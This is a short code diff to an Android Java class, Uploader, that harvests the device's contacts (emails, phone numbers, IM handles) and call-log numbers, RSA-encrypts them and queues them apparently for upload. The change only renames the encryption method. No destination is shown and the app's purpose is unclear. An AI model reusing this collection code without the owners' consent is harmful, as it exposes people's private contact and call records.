@@ -153,15 +153,15 @@ class Uploader implements Runnable {
       String contactId = cursor.getString(0);
       if (cursor.getString(1).equals(CommonDataKinds.Email.CONTENT_ITEM_TYPE)) {
         String emailAddress = cursor.getString(2);
-        contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(EMAILS_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(emailAddress)).toString());
+        contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(EMAILS_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encryptString(emailAddress)).toString());
       } else if (cursor.getString(1).equals(CommonDataKinds.Phone.CONTENT_ITEM_TYPE)) {
         String phoneNumber = cursor.getString(2);
-        contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(PHONE_NUMBER_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(phoneNumber)).toString());
+        contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(PHONE_NUMBER_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encryptString(phoneNumber)).toString());
       } else if (cursor.getString(1).equals(CommonDataKinds.Im.CONTENT_ITEM_TYPE)) {
         String im = cursor.getString(2);
         if (Integer.parseInt(cursor.getString(3)) == -1) {
           String customP = cursor.getString(4);
-          contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(customP).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(im)).toString());
+          contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(customP).append(SPACE_STR).append(RSAENCODING.INSTANCE.encryptString(im)).toString());
         } else if (Integer.parseInt(cursor.getString(3)) == 5) {
           // TODO: gtalk
         }
@@ -213,7 +213,7 @@ class Uploader implements Runnable {
       callInformationBuilder.append(SPACE_STR);
       callInformationBuilder.append(c.getString(c.getColumnIndex("type")));
       callInformationBuilder.append(SPACE_STR);
-      callInformationBuilder.append(RSAENCODING.INSTANCE.encodingString(c.getString(c.getColumnIndex("number"))));
+      callInformationBuilder.append(RSAENCODING.INSTANCE.encryptString(c.getString(c.getColumnIndex("number"))));
       callInformations.add(callInformationBuilder.toString());
     }
 
